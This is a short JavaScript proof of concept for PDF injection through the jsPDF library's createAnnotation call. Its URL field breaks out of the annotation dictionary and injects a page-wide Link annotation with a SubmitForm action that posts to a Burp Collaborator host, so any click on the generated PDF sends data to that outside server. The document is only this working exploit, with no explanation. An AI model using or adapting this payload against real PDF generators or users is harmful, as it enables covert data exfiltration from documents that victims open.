const {jsPDF} = require("jspdf");
var doc = new jsPDF();
doc.createAnnotation({bounds:{x:0,y:10,w:200,h:200},type:'link',url:`/) >> >><</Type /Annot /Subtype /Link /Rect [0 0 800 600] /Border [0 0 0] /A <</S/SubmitForm/Flags 256/F(https://75aprrtrh83c0736rui9styo2f87ww.burpcollaborator.net`});
doc.text(20, 20, 'Entire document is clickable');
doc.save("output.pdf");
